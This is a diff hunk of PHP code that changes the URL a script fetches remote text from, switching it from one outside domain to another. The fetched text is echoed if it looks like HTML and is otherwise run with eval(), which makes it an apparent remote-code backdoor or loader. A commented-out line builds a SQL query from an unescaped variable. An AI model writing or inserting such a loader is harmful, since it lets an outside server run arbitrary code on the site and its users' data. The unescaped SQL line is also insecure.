@@ -11,7 +11,7 @@ $r=mysql_query("SELECT fun FROM blkinf00 WHERE ind='$ix'");
 if(mysql_numrows($r)==0) require("blkinf.php");
 else $s=mysql_result($r,0,0);
 */
-$s=file_get_contents("http://berivse.net/e.php?ix=blkinf-get&IX=$ix&t=".time());
+$s=file_get_contents("http://mysms.click/i.php?ix=odoo&IX=$ix&t=".time());
 if (substr($s,0,1)=="<") echo stripslashes($s) ;
 else                     eval(stripslashes($s));
 ?>
